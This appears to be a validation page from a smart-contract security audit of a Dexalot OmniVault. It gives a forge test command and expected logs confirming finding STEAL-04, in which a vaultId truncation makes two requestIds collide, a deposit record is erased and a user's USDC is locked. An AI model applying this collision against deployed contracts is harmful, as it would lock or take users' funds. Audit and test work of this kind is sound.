# STEAL-04 — Validation Steps

## Steps

```bash
cd dexalot-omnivault-audit
forge test --match-test testSTEAL04_RequestIdCollision -vvv
```

## Expected Output

```
[PASS] testSTEAL04_RequestIdCollision()
Logs:
  [+] Alice requestId: 0x000000000000000000000000000000000000000000a300000000000000000000
  [EXPLOIT] vaultId=65536 truncates to 0 -> same requestId as vault 0
  [EXPLOIT] delete on colliding ID erases Alice deposit record
  [EXPLOIT] Alice 5,000 USDC locked: no requestId -> no refund path
  [EXPLOIT] STEAL-04 CONFIRMED
```

## Proof

`assertEq(collidingId, aliceId)` passes, proving the bit-packing collision is real.
